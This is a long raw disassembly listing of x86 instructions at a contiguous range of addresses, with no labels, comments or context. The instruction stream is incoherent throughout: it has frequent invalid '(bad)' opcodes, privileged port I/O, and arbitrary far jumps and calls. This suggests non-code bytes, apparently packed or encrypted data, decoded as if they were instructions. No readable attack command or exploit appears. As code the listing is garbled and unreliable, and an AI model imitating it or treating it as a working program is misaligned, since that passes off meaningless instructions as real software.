  416561:	js     0x416523
  416563:	hlt    
  416564:	dec    edx
  416565:	dec    ebx
  416566:	xchg   ebp,eax
  416567:	jmp    0x4ab3a43
  41656c:	outs   dx,BYTE PTR ds:[esi]
  41656d:	repz sahf 
  41656f:	fs dec esi
  416571:	sbb    DWORD PTR [edx-0x13],esi
  416574:	arpl   WORD PTR [esi-0xa],bp
  416577:	adc    cl,BYTE PTR [eax-0x1021aba8]
  41657d:	sbb    al,0x86
  41657f:	out    dx,eax
  416580:	shr    ah,0x92
  416583:	jecxz  0x4165e4
  416585:	xor    bh,bl
  416587:	mov    ecx,0x577d11bc
  41658c:	xor    bh,dl
  41658e:	in     al,0xb4
  416590:	jg     0x416527
  416592:	lods   al,BYTE PTR ds:[esi]
  416593:	idiv   DWORD PTR [edi+0x17fefce]
  416599:	push   0x4e
  41659b:	sbb    eax,0x23b277ba
  4165a0:	xchg   esp,eax
  4165a1:	jmp    0x416578
  4165a3:	repz pop edi
  4165a5:	inc    edx
  4165a6:	jnp    0x416620
  4165a8:	sbb    eax,0x4134ea29
  4165ad:	cmp    eax,0x47176745
  4165b2:	push   ds
  4165b3:	pop    esp
  4165b4:	sub    al,0x1c
  4165b6:	shl    DWORD PTR [eax-0x76],1
  4165b9:	xchg   ebx,eax
  4165ba:	loopne 0x416606
  4165bc:	pop    ebx
  4165bd:	fs xchg edi,eax
  4165bf:	fs leave 
  4165c1:	(bad)  [edi+0x24]
  4165c4:	sub    edi,esi
  4165c6:	lock or al,0x51
  4165c9:	mov    ch,0x8c
  4165cb:	lds    edx,FWORD PTR [esi+0x3cfd1aee]
  4165d1:	add    ah,BYTE PTR [esi+0x17]
  4165d4:	retf   
  4165d5:	mov    bl,0xca
  4165d7:	jp     0x4165ce
  4165d9:	jo     0x416658
  4165db:	or     DWORD PTR [eax],eax
  4165dd:	mov    esp,0x3db62cf9
  4165e2:	pusha  
  4165e3:	lods   eax,DWORD PTR ds:[esi]
  4165e4:	mov    eax,0xd1a699c9
  4165e9:	xor    edi,DWORD PTR ds:0x77b2497b
  4165ef:	pop    ebp
  4165f0:	js     0x416603
  4165f2:	aad    0xa1
  4165f4:	sbb    ebp,0xffffff83
  4165f7:	mov    ebx,0xd35b560e
  4165fc:	push   ecx
  4165fd:	add    al,0x61
  4165ff:	enter  0xb391,0xad
  416603:	xchg   ecx,eax
  416604:	retf   0xcb75
  416607:	sar    BYTE PTR [eax-0x5ce1883a],cl
  41660d:	iret   
  41660e:	outs   dx,BYTE PTR ds:[esi]
  41660f:	or     dl,dl
  416611:	or     BYTE PTR [edx+0x27],0xd6
  416615:	and    al,0x5e
  416617:	mov    ah,0xd2
  416619:	sub    DWORD PTR [ebx+0x25cdb065],edx
  41661f:	nop    eax
  416622:	shl    BYTE PTR [edx-0x7],1
  416625:	loope  0x4166a4
  416627:	(bad)  
  416628:	mov    ch,0x8
  41662a:	lock jmp 0x4166a8
  41662d:	jecxz  0x416633
  41662f:	mov    ecx,0xc02278c2
  416634:	pop    eax
  416635:	iret   
  416636:	xor    dl,cl
  416638:	mov    eax,ds:0x653f3fce
  41663d:	push   ebp
  41663e:	fucom  st(4)
  416640:	std    
  416641:	or     al,0xf3
  416643:	sti    
  416644:	scas   al,BYTE PTR es:[edi]
  416645:	mov    ?,eax
  416647:	xchg   edx,eax
  416648:	mov    al,0x72
  41664a:	ret    0x2928
  41664d:	mov    bl,0x7b
  41664f:	ss js  0x4165ff
  416652:	jmp    0x416635
  416654:	mov    ebx,0xa1aff7ca
  416659:	or     al,0x1b
  41665b:	jp     0x416687
  41665d:	xor    esp,edi
  41665f:	fld    QWORD PTR [edx-0x5ac93398]
  416665:	pusha  
  416666:	das    
  416667:	lea    ebp,[esi-0x5d]
  41666a:	fwait
  41666b:	dec    edx
  41666c:	pop    ds
  41666d:	(bad)  
  41666e:	jmp    0x416691
  416670:	xchg   edx,eax
  416671:	push   edi
  416672:	pop    eax
  416673:	cmp    BYTE PTR [edi],cl
  416675:	jns    0x4166e9
  416677:	mov    esp,0x43fb4252
  41667c:	adc    esi,DWORD PTR [edx+0x43]
  41667f:	mov    bh,0xd5
  416681:	ins    DWORD PTR es:[edi],dx
  416682:	ins    BYTE PTR es:[edi],dx
  416683:	(bad)  
  416684:	mov    ebx,0x705f76fe
  416689:	mov    esi,0x34e35ece
  41668e:	xlat   BYTE PTR ds:[ebx]
  41668f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416690:	mov    WORD PTR [ebx+0x1f],es
  416693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416694:	jg     0x41666d
  416696:	mov    ecx,0x5d85e623
  41669b:	mov    ebx,0xe9fc85bf
  4166a0:	ja     0x416635
  4166a2:	outs   dx,BYTE PTR cs:[esi]
  4166a4:	es xchg ecx,eax
  4166a6:	xchg   ebp,eax
  4166a7:	xor    esp,DWORD PTR [edi]
  4166a9:	mov    esp,0xe147f911
  4166ae:	leave  
  4166af:	jecxz  0x4166a1
  4166b1:	int    0x60
  4166b3:	bound  eax,QWORD PTR [ebx]
  4166b5:	sub    bl,BYTE PTR [ecx]
  4166b7:	push   es
  4166b8:	sti    
  4166b9:	or     esp,DWORD PTR [esi+0x63]
  4166bc:	adc    BYTE PTR [esi-0x51649bb7],ch
  4166c2:	add    al,ch
  4166c4:	ja     0x41664a
  4166c6:	lods   al,BYTE PTR gs:[esi]
  4166c8:	xchg   edi,eax
  4166c9:	jmp    0xf842a449
  4166ce:	add    dl,BYTE PTR [ecx-0x6c]
  4166d1:	cs mov eax,0x919eb7d8
  4166d7:	ins    BYTE PTR es:[edi],dx
  4166d8:	jmp    0x6db31c08
  4166dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166de:	and    ecx,DWORD PTR [eax]
  4166e0:	ja     0x416669
  4166e2:	jmp    FWORD PTR [ebx+0x41882a15]
  4166e8:	pop    eax
  4166e9:	push   cs
  4166ea:	cli    
  4166eb:	and    BYTE PTR [ebx-0x79],bh
  4166ee:	add    ah,BYTE PTR [ecx+0x86f769b]
  4166f4:	div    DWORD PTR [edx-0x7c4990e9]
  4166fa:	sbb    ecx,ebx
  4166fc:	lahf   
  4166fd:	adc    al,0xa0
  4166ff:	sub    dl,BYTE PTR [ebp-0x1a93c2cd]
  416705:	xor    eax,0xcb83b215
  41670a:	js     0x4166b7
  41670c:	mov    dh,0xab
  41670e:	fiadd  DWORD PTR [eax-0xfb58a10]
  416714:	dec    eax
  416715:	xlat   BYTE PTR ds:[ebx]
  416716:	imul   esp,DWORD PTR [edx-0x6b83b7ed],0x7909f7b9
  416720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416721:	or     BYTE PTR [eax+0x5d83264b],bl
  416727:	cmp    BYTE PTR [ebp-0x3c2355a9],ah
  41672d:	les    ecx,FWORD PTR [edi+ecx*2+0x70]
  416731:	and    eax,0x5c63ad71
  416736:	fld    TBYTE PTR [eax-0x42]
  416739:	pushf  
  41673a:	dec    ebp
  41673b:	mov    BYTE PTR [ebp+0x34],dh
  41673e:	push   eax
  41673f:	sbb    DWORD PTR [edi-0x32bf7f08],esp
  416745:	scas   eax,DWORD PTR es:[edi]
  416746:	and    al,0x8f
  416748:	xchg   edx,eax
  416749:	mov    ecx,0xf196ab8
  41674e:	outs   dx,BYTE PTR ds:[esi]
  41674f:	adc    ebp,DWORD PTR [ebp+0xc]
  416752:	hlt    
  416753:	xchg   edx,eax
  416754:	mov    ebp,0xc655eb80
  416759:	push   esp
  41675a:	clc    
  41675b:	int3   
  41675c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41675d:	xor    DWORD PTR [ebp+eiz*4+0x5b360500],esi
  416764:	push   ebx
  416765:	sbb    DWORD PTR ds:0x63fd00ec,edi
  41676b:	push   esp
  41676c:	sub    BYTE PTR [edi+0x2c],cl
  41676f:	sub    eax,0x1af8185b
  416774:	sub    DWORD PTR [edx+edx*1+0x4a],esi
  416778:	cs push edx
  41677a:	in     al,dx
  41677b:	mov    al,ds:0x75893e62
  416780:	jmp    0x4167c9
  416782:	cld    
  416783:	xchg   ebp,eax
  416784:	test   eax,0xc50b8da6
  416789:	xor    eax,0x92ee47b4
  41678e:	push   edx
  41678f:	add    BYTE PTR [edi+0x6a],al
  416792:	mov    ecx,0x99df1883
  416797:	in     eax,dx
  416798:	inc    eax
  416799:	inc    ebp
  41679a:	mov    cs,WORD PTR [edx]
  41679c:	shl    DWORD PTR [edi-0x71],cl
  41679f:	stc    
  4167a0:	rcr    DWORD PTR [edx-0x31],1
  4167a3:	mov    edx,DWORD PTR [ebx-0x4de4c86a]
  4167a9:	(bad)  
  4167aa:	xor    al,0x87
  4167ac:	test   BYTE PTR [esi],ah
  4167ae:	fnstsw WORD PTR [esi]
  4167b0:	pop    ds
  4167b1:	sbb    cl,al
  4167b3:	add    BYTE PTR [eax-0x30],bh
  4167b6:	loopne 0x4167be
  4167b8:	fsubr  st(7),st
  4167ba:	add    BYTE PTR ds:0x730960b1,ch
  4167c0:	mov    al,0xe7
  4167c2:	xchg   esi,eax
  4167c3:	retf   
  4167c4:	or     eax,DWORD PTR [ebx+0x65]
  4167c7:	xor    al,0x52
  4167c9:	dec    esi
  4167ca:	mov    ds:0xef7034b6,al
  4167cf:	inc    esi
  4167d0:	inc    edx
  4167d1:	popf   
  4167d2:	sbb    DWORD PTR [esp+edi*1+0x77],0x15
  4167d7:	imul   ecx,DWORD PTR ds:0x7c3f6ae3,0xffffffba
  4167df:	in     eax,dx
  4167e0:	add    DWORD PTR [esi+0x3aa2fed3],0xffffff97
  4167e7:	inc    edi
  4167e8:	inc    ecx
  4167e9:	jmp    0x4167c1
  4167eb:	mov    bh,bl
  4167ed:	push   ss
  4167ee:	fild   QWORD PTR [ecx]
  4167f0:	mov    al,ds:0x706dbb19
  4167f5:	int    0x14
  4167f7:	xchg   edi,eax
  4167f8:	aam    0xf8
  4167fa:	mov    ebp,0xeb795756
  4167ff:	pop    ebx
  416800:	outs   dx,BYTE PTR ds:[esi]
  416801:	ffreep st(4)
  416803:	and    DWORD PTR [ecx],esp
  416805:	rcl    DWORD PTR [ebx-0x7d68c295],0xf
  41680c:	nop
  41680d:	sahf   
  41680e:	les    esi,FWORD PTR [ebx+0x70d58993]
  416814:	(bad)  
  416815:	sub    dl,BYTE PTR es:[ecx+0xc24ca7c]
  41681c:	cwde   
  41681d:	call   FWORD PTR [ebx+0x12]
  416820:	sub    eax,0xfe6f129b
  416825:	inc    ebp
  416826:	dec    DWORD PTR [edi*1+0x1d05f180]
  41682d:	fs stc 
  41682f:	int3   
  416830:	add    eax,0x1000de86
  416835:	ins    BYTE PTR es:[edi],dx
  416836:	(bad)  
  416837:	js     0x416856
  416839:	shr    esi,cl
  41683b:	into   
  41683c:	or     edx,ebp
  41683e:	jle    0x4167c0
  416840:	adc    eax,ebx
  416842:	pusha  
  416843:	lds    ecx,FWORD PTR [ebp-0x4f543811]
  416849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41684a:	adc    DWORD PTR ds:0x45214236,eax
  416850:	scas   al,BYTE PTR es:[edi]
  416851:	xchg   ebx,eax
  416852:	cs inc eax
  416854:	shl    BYTE PTR ds:0x129efa82,0x84
  41685b:	adc    edx,ebx
  41685d:	mov    ch,0x7e
  41685f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416860:	in     al,0x98
  416862:	imul   esp,DWORD PTR [edi],0x3
  416865:	add    ebp,DWORD PTR [edi+0x2b4d9807]
  41686b:	mov    ah,BYTE PTR [edx-0x3f]
  41686e:	pop    ds
  41686f:	push   cs
  416870:	lods   al,BYTE PTR ds:[esi]
  416871:	ret    
  416872:	pop    ecx
  416873:	jns    0x416809
  416875:	jo     0x416817
  416877:	retf   0xb877
  41687a:	xor    al,bh
  41687c:	inc    ebp
  41687d:	fdivp  st(6),st
  41687f:	xchg   edi,eax
  416880:	and    eax,0x7902dee9
  416885:	sti    
  416886:	in     eax,0xfe
  416888:	push   edx
  416889:	mov    esi,0x44f39f07
  41688e:	xchg   edx,eax
  41688f:	add    dl,BYTE PTR [ebx]
  416891:	push   0xffffff91
  416893:	pop    esi
  416894:	inc    edi
  416895:	bound  ebx,QWORD PTR [ebx+edi*8]
  416898:	cwde   
  416899:	in     al,dx
  41689a:	in     eax,dx
  41689b:	in     al,dx
  41689c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41689d:	out    dx,al
  41689e:	je     0x4168b0
  4168a0:	mov    edx,0x4c9bd883
  4168a5:	fwait
  4168a6:	sub    esi,DWORD PTR [edx]
  4168a8:	pop    ecx
  4168a9:	cld    
  4168aa:	cmp    al,0x45
  4168ac:	in     eax,dx
  4168ad:	jl     0x4168a7
  4168af:	jb     0x416833
  4168b1:	xor    DWORD PTR [ecx-0x60],edx
  4168b4:	inc    edi
  4168b5:	mov    DWORD PTR ds:[ebx-0x46],edx
  4168b9:	push   edx
  4168ba:	je     0x416856
  4168bc:	push   es
  4168bd:	push   es
  4168be:	mov    bh,0x81
  4168c0:	imul   edx,DWORD PTR [edi-0x67],0x58c714d
  4168c7:	call   0x719e:0xeae1ac47
  4168ce:	or     DWORD PTR [ebp-0x44],edx
  4168d1:	cs das 
  4168d3:	mov    edi,0xe979d947
  4168d8:	cmp    DWORD PTR [ebp+0x31b45594],ebx
  4168de:	cli    
  4168df:	mov    eax,0x66f9d7d0
  4168e4:	imul   edi,ebp,0xce79832f
  4168ea:	mov    DWORD PTR [ecx+0xca97526],eax
  4168f0:	adc    bl,BYTE PTR [ecx]
  4168f2:	aam    0xa7
  4168f4:	popf   
  4168f5:	adc    eax,0x99056cc1
  4168fa:	inc    ebp
  4168fb:	cmp    eax,0x5c0b1880
  416900:	mov    edi,0xc484d73
  416905:	mov    eax,0xc2781f5f
  41690a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41690b:	ret    
  41690c:	push   ss
  41690d:	dec    eax
  41690e:	out    dx,al
  41690f:	test   DWORD PTR [edi-0x185697d],edi
  416915:	cdq    
  416916:	mov    ecx,0x46e3c141
  41691b:	pop    esi
  41691c:	iret   
  41691d:	sub    esi,DWORD PTR [eax]
  41691f:	arpl   WORD PTR [ebx+0x21],di
  416922:	add    BYTE PTR [edx],0x6f
  416925:	xor    al,cl
  416927:	mov    eax,DWORD PTR [edi+0x11]
  41692a:	test   BYTE PTR [edi],cl
  41692c:	mov    eax,ds:0xe7076ca1
  416931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416932:	jmp    0x9e6c:0x8f4f8422
  416939:	inc    ebx
  41693a:	or     BYTE PTR [ecx+ebp*4-0x1112baef],ah
  416941:	in     eax,dx
  416942:	and    esp,DWORD PTR [esi]
  416944:	mov    esi,0xc92cd17d
  416949:	test   DWORD PTR [edx+0x3a88fa45],ebx
  41694f:	mov    bh,0x0
  416951:	or     BYTE PTR [esi+0x2a2d0033],0x35
  416958:	jae    0x416955
  41695a:	xor    dl,al
  41695c:	rol    esp,1
  41695e:	mov    ch,0x8
  416960:	fld    QWORD PTR [ebx+esi*2+0x70e59427]
  416967:	gs cmc 
  416969:	pop    ecx
  41696a:	jns    0x4169e3
  41696c:	mov    ebx,0xae8a2c56
  416971:	pop    es
  416972:	jno    0x41696f
  416974:	adc    al,0x52
  416976:	sahf   
  416977:	popa   
  416978:	out    0x9b,al
  41697a:	or     al,0x4f
  41697c:	inc    ecx
  41697d:	inc    esp
  41697e:	dec    esi
  41697f:	test   al,0xdc
  416981:	pop    es
  416982:	aas    
  416983:	pop    ebx
  416984:	repz call 0x98ff:0xb39bfe83
  41698c:	shl    BYTE PTR [ecx],cl
  41698e:	jne    0x41694c
  416990:	imul   ebx,DWORD PTR [ecx+0x7972a11a],0xa448fdab
  41699a:	pop    edi
  41699b:	or     eax,0x63ab309d
  4169a0:	push   edx
  4169a1:	add    al,0x73
  4169a3:	xchg   esi,eax
  4169a4:	pop    ebx
  4169a5:	mov    edx,0x972a2171
  4169aa:	(bad)  
  4169ab:	shl    BYTE PTR [ecx+eiz*4],0x11
  4169af:	inc    ebp
  4169b0:	xor    eax,0x2d3a392
  4169b5:	inc    esi
  4169b6:	das    
  4169b7:	fstp   TBYTE PTR [ecx]
  4169b9:	adc    al,0x65
  4169bb:	mov    edx,0x7eb9e5f7
  4169c0:	xor    eax,0xedcee860
  4169c5:	inc    edx
  4169c6:	mov    ecx,0xdd208377
  4169cb:	sbb    al,0x0
  4169cd:	shl    BYTE PTR [esi-0x51],1
  4169d0:	inc    ecx
  4169d1:	aas    
  4169d2:	(bad)  
  4169d3:	scas   al,BYTE PTR es:[edi]
  4169d4:	retf   
  4169d5:	jns    0x4169d3
  4169d7:	cmp    eax,0x62edd3e0
  4169dc:	ret    
  4169dd:	int    0x83
  4169df:	add    eax,0x491c9c2b
  4169e4:	push   ebx
  4169e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e6:	mov    ch,0xf0
  4169e8:	mov    cl,0x7f
  4169ea:	int3   
  4169eb:	loope  0x4169ff
  4169ed:	std    
  4169ee:	(bad)  
  4169ef:	out    0xd3,eax
  4169f1:	push   ebx
  4169f2:	pop    esp
  4169f3:	mov    eax,ds:0x395be492
  4169f8:	mov    edi,0xe052b047
  4169fd:	fdiv   QWORD PTR [ebp+0x72]
  416a00:	ret    0x8eda
  416a03:	inc    ebp
  416a04:	adc    eax,0xf2e12a91
  416a09:	mov    dh,0x36
  416a0b:	add    edx,ecx
  416a0d:	arpl   WORD PTR [eax-0x15],di
  416a10:	fwait
  416a11:	cmp    eax,0xf8ceb0ef
  416a16:	popa   
  416a17:	(bad)  
  416a18:	pop    ss
  416a19:	cmp    DWORD PTR [edi-0x42],eax
  416a1c:	mov    esp,0x70f33cd3
  416a21:	lahf   
  416a22:	outs   dx,DWORD PTR ds:[esi]
  416a23:	mov    esi,0x2d0a8587
  416a28:	mov    ss,edi
  416a2a:	jno    0x416a52
  416a2c:	sub    DWORD PTR [ebx-0x4a7a5341],ebp
  416a32:	idiv   DWORD PTR [eax+0x3073ec5e]
  416a38:	jns    0x416a05
  416a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a3b:	fsubrp st(1),st
  416a3d:	iret   
  416a3e:	pop    eax
  416a3f:	and    eax,0x54d4221
  416a44:	push   edi
  416a45:	pop    esp
  416a46:	aad    0x7d
  416a48:	mov    esp,0x86684caf
  416a4d:	xchg   esi,eax
  416a4e:	call   0x7a13:0x8ddee765
  416a55:	out    dx,eax
  416a56:	xchg   ebx,eax
  416a57:	mov    ebp,0x1c297f2a
  416a5c:	enter  0x7ab5,0x63
  416a60:	pop    esp
  416a61:	xor    ecx,DWORD PTR [ebx]
  416a63:	cdq    
  416a64:	mov    dl,0xce
  416a66:	test   DWORD PTR [esp+eax*2+0x56],ebp
  416a6a:	xchg   DWORD PTR [ebx+0x5492011e],edi
  416a70:	lds    ecx,FWORD PTR ds:0x147aa3c6
  416a76:	jnp    0x416a69
  416a78:	sbb    DWORD PTR [ebp-0x1512fca6],0x43700a1e
  416a82:	mov    ds:0x23d89b51,al
  416a87:	push   eax
  416a88:	in     al,dx
  416a89:	inc    ebx
  416a8a:	mov    eax,ds:0xc66feec5
  416a8f:	shr    ebp,1
  416a91:	(bad)  
  416a92:	mov    es:0x1f940dc2,al
  416a98:	mov    bh,0x19
  416a9a:	aaa    
  416a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a9c:	nop
  416a9d:	mov    edi,0x57a70e31
  416aa2:	dec    ebp
  416aa3:	ss xchg ecx,eax
  416aa5:	in     al,0x28
  416aa7:	imul   edx,DWORD PTR [eax],0x18a9dd76
  416aad:	ja     0x416ada
  416aaf:	inc    esp
  416ab0:	stos   DWORD PTR es:[edi],eax
  416ab1:	mov    esp,0x33545a00
  416ab6:	mov    edi,0x239bde5f
  416abb:	and    dh,dl
  416abd:	shl    BYTE PTR [eax],0x31
  416ac0:	dec    esp
  416ac1:	cmp    DWORD PTR [ebp-0x61560437],edi
  416ac7:	hlt    
  416ac8:	mov    edi,0x6137c19b
  416acd:	(bad)  
  416ace:	daa    
  416acf:	push   eax
  416ad0:	jnp    0x416b2d
  416ad2:	sub    al,0x9
  416ad4:	loop   0x416af2
  416ad6:	dec    eax
  416ad7:	cmp    BYTE PTR ds:[edi+edx*2],0x81
  416adc:	lea    eax,[edx+0xc]
  416adf:	mov    DWORD PTR [edx-0x31],eax
  416ae2:	mov    esi,DWORD PTR [ecx]
  416ae4:	daa    
  416ae5:	sahf   
  416ae6:	imul   ebx,DWORD PTR [eax],0x221d42ec
  416aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aed:	loop   0x416abd
  416aef:	inc    edx
  416af0:	inc    eax
  416af1:	push   0xb9d82235
  416af6:	in     eax,0x6f
  416af8:	or     al,0xc2
  416afa:	pop    ss
  416afb:	pop    esi
  416afc:	cmp    cl,BYTE PTR [ecx+0x331da771]
  416b02:	push   ss
  416b03:	push   0xf0a5b5c3
  416b08:	xor    BYTE PTR [edi+eax*8-0x4a],0x1b
  416b0d:	cmp    eax,0xb71343ce
  416b12:	leave  
  416b13:	out    dx,al
  416b14:	loopne 0x416ac1
  416b16:	mov    bh,0x42
  416b18:	adc    eax,0x4b2e04de
  416b1d:	cmp    bh,BYTE PTR ds:0xa208326c
  416b23:	xor    BYTE PTR [eax],ah
  416b25:	sub    DWORD PTR [edx+0x6c0b0724],ebx
  416b2b:	inc    esp
  416b2c:	lods   eax,DWORD PTR ds:[esi]
  416b2d:	inc    edx
  416b2e:	in     eax,0xe1
  416b30:	out    dx,al
  416b31:	and    al,0x3
  416b33:	repz mov ss,eax
  416b36:	jmp    0x1a40:0x93d17751
  416b3d:	hlt    
  416b3e:	add    ebp,DWORD PTR [ebx+0x6c]
  416b41:	mov    ah,0xd0
  416b43:	jecxz  0x416b37
  416b45:	mov    eax,ds:0x448d975c
  416b4a:	pop    eax
  416b4b:	stos   DWORD PTR es:[edi],eax
  416b4c:	xchg   ecx,eax
  416b4d:	test   DWORD PTR [eax],0xec671acd
  416b53:	push   cs
  416b54:	dec    eax
  416b55:	xor    bh,BYTE PTR [eax+0x23]
  416b58:	dec    edx
  416b59:	ret    0xbc45
  416b5c:	sub    ecx,ebx
  416b5e:	test   dh,0x54
  416b61:	sar    dl,1
  416b63:	mov    eax,0xe595bdc
  416b68:	xchg   edi,eax
  416b69:	xor    bh,0x34
  416b6c:	jmp    0x4791:0x624fdabd
  416b73:	xor    eax,0xa5238d62
  416b78:	push   ds
  416b79:	xor    eax,0x9fd3f0c2
  416b7e:	push   ds
  416b7f:	sub    eax,0x73418f0
  416b84:	pop    ds
  416b85:	arpl   WORD PTR [esp+eax*1+0x3f22d1a1],dx
  416b8c:	sar    DWORD PTR [eax],0x3c
  416b8f:	fwait
  416b90:	push   ss
  416b91:	dec    esi
  416b92:	(bad)  
  416b93:	call   0xca67:0x806da49a
  416b9a:	push   cs
  416b9b:	pop    esp
  416b9c:	cmp    ah,bh
  416b9e:	call   0x2d96:0xd1f554b9
  416ba5:	xor    edi,eax
  416ba7:	clc    
  416ba8:	pop    ebp
  416ba9:	jb     0x416ba5
  416bab:	(bad)  
  416bac:	pop    esp
  416bad:	mov    ecx,0x2cd057e6
  416bb2:	(bad)  
  416bb3:	pop    ds
  416bb4:	out    dx,eax
  416bb5:	lock inc edi
  416bb7:	fs inc eax
  416bb9:	imul   edi,esi,0x24
  416bbc:	sbb    DWORD PTR ds:0x3fd50fcd,ebp
  416bc2:	push   edi
  416bc3:	js     0x416ba7
  416bc5:	cmp    cl,BYTE PTR [ecx]
  416bc7:	clc    
  416bc8:	ss mov ebx,0x5caa5675
  416bce:	(bad)  [ecx]
  416bd0:	sbb    BYTE PTR [ecx-0x4634a96a],cl
  416bd6:	add    al,0xcd
  416bd8:	and    eax,0xa92d7201
  416bdd:	repnz imul edi,DWORD PTR [ebp+0x38e11d47],0x42
  416be5:	cwde   
  416be6:	enter  0xe1c4,0x99
  416bea:	outs   dx,BYTE PTR ds:[esi]
  416beb:	xchg   al,bl
  416bed:	cmp    al,0x9a
  416bef:	jmp    0x1643:0x53b21018
  416bf6:	xor    eax,0x46604195
  416bfb:	mov    al,0x9c
  416bfd:	mov    dh,BYTE PTR [esi+0x75001c4f]
  416c03:	add    edx,DWORD PTR [ebx-0x3b]
  416c06:	lods   al,BYTE PTR ds:[esi]
  416c07:	mov    edi,0xf89b73b
  416c0c:	cmp    DWORD PTR [edi],ecx
  416c0e:	pop    ds
  416c0f:	lahf   
  416c10:	xor    edi,ebx
  416c12:	(bad)  
  416c13:	pop    edx
  416c14:	mul    dl
  416c16:	push   ecx
  416c17:	das    
  416c18:	sahf   
  416c19:	xor    BYTE PTR [edi+eiz*8-0x79],ch
  416c1d:	(bad)  
  416c1e:	sbb    edi,esp
  416c20:	pop    esp
  416c21:	aaa    
  416c22:	(bad)  
  416c23:	fmul   st(2),st
  416c25:	add    esi,esi
  416c27:	ret    0x252
  416c2a:	pop    esi
  416c2b:	sahf   
  416c2c:	fadd   DWORD PTR [eax]
  416c2e:	pop    ebx
  416c2f:	cwde   
  416c30:	out    dx,al
  416c31:	lock scas al,BYTE PTR es:[edi]
  416c33:	cmp    cl,ah
  416c35:	dec    esp
  416c36:	sbb    eax,0x929a8b57
  416c3b:	dec    ebx
  416c3c:	cmp    eax,0xe653d18e
  416c41:	mov    ebp,0x6c3df0d7
  416c46:	sbb    al,0xcc
  416c48:	dec    edx
  416c49:	fild   WORD PTR [edx-0x267bdcc9]
  416c4f:	inc    esi
  416c50:	sbb    BYTE PTR [ebx+0x62],0xf
  416c54:	out    dx,al
  416c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c56:	xor    BYTE PTR [ecx+0x5e],0x9a
  416c5a:	test   eax,0x652b7ca2
  416c5f:	pop    edi
  416c60:	push   esp
  416c61:	dec    edx
  416c62:	shl    DWORD PTR [ebp-0x6adc1249],0x35
  416c69:	xchg   ecx,eax
  416c6a:	ror    BYTE PTR [edi+0x6b],1
  416c6d:	add    ebx,DWORD PTR [ebp-0x5d]
  416c70:	in     al,dx
  416c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c72:	in     al,dx
  416c73:	loope  0x416caf
  416c75:	test   al,0x7f
  416c77:	retf   0x86e6
  416c7a:	mov    ebp,0x4ff51c07
  416c7f:	pop    es
  416c80:	or     al,0x16
  416c82:	mov    ch,0xf0
  416c84:	and    ebp,DWORD PTR [eax+eiz*1]
  416c87:	pop    ecx
  416c88:	jp     0x416cbb
  416c8a:	adc    esp,DWORD PTR [esi]
  416c8c:	iret   
  416c8d:	sahf   
  416c8e:	add    dl,BYTE PTR [ebx]
  416c90:	mov    al,ds:0xe558dd6b
  416c95:	popf   
  416c96:	icebp  
  416c97:	lea    ebx,[ebp+0x3f20adc6]
  416c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c9e:	cmp    al,0xe7
  416ca0:	iret   
  416ca1:	and    DWORD PTR [ecx-0x35],esi
  416ca4:	aaa    
  416ca5:	push   esp
  416ca6:	loopne 0x416c56
  416ca8:	mov    ds:0xa2383708,al
  416cad:	sbb    BYTE PTR [esi+0x3e],ch
  416cb0:	mov    esi,DWORD PTR [ecx-0x28ab2330]
  416cb6:	pop    ecx
  416cb7:	mov    ch,0x64
  416cb9:	mov    al,0x7b
  416cbb:	lock leave 
  416cbd:	sbb    BYTE PTR [ecx],ch
  416cbf:	and    ah,BYTE PTR ds:0x8e7b4596
  416cc5:	push   ecx
  416cc6:	add    eax,0xc1316eb9
  416ccb:	mov    dl,0xbc
  416ccd:	stos   DWORD PTR es:[edi],eax
  416cce:	mov    BYTE PTR [ecx],al
  416cd0:	rcr    BYTE PTR [ebp-0x53],cl
  416cd3:	lds    ebp,FWORD PTR [ebx]
  416cd5:	push   es
  416cd6:	pop    ebx
  416cd7:	xor    dh,ah
  416cd9:	(bad)  
  416cdb:	sar    esp,0x4a
  416cde:	mov    WORD PTR [ebp-0x28],ds
  416ce1:	pusha  
  416ce2:	jecxz  0x416cb2
  416ce4:	mov    ch,0xdd
  416ce6:	cld    
  416ce7:	iret   
  416ce8:	dec    eax
  416ce9:	bound  ebp,QWORD PTR [ebp+0x1c63ceba]
  416cef:	pop    edi
  416cf0:	push   cs
  416cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cf2:	imul   ebp,DWORD PTR [ecx+eax*4-0x6ede0990],0xf2dc3ad
  416cfd:	mov    bp,0xc1af
  416d01:	imul   esi,DWORD PTR [ebx+ecx*8-0xc],0x6c
  416d06:	cmc    
  416d07:	out    0x73,eax
  416d09:	jg     0x416d61
  416d0b:	data16 mov bh,0xcc
  416d0e:	iret   
  416d0f:	retf   
  416d10:	ror    DWORD PTR [esi],cl
  416d12:	pop    esp
  416d13:	xor    ebx,DWORD PTR [ebp+0x7b]
  416d16:	cmp    BYTE PTR [ebx],0x37
  416d19:	inc    edi
  416d1a:	les    ecx,FWORD PTR [ebp-0x1637e401]
  416d20:	xchg   ebx,eax
  416d21:	sbb    BYTE PTR [eax-0xa],dh
  416d24:	dec    ebp
  416d25:	or     DWORD PTR [ecx+0x2f],0xffffff9b
  416d29:	push   edx
  416d2a:	fidivr DWORD PTR [esi+0x1]
  416d2d:	xor    BYTE PTR [ebx],dh
  416d2f:	jle    0x416d2d
  416d31:	aad    0xfd
  416d33:	push   0xffffff95
  416d35:	pop    ebp
  416d36:	add    BYTE PTR [eax+0x79],al
  416d39:	adc    BYTE PTR [esi-0x28b00222],bl
  416d3f:	add    bl,ah
  416d41:	pop    ebx
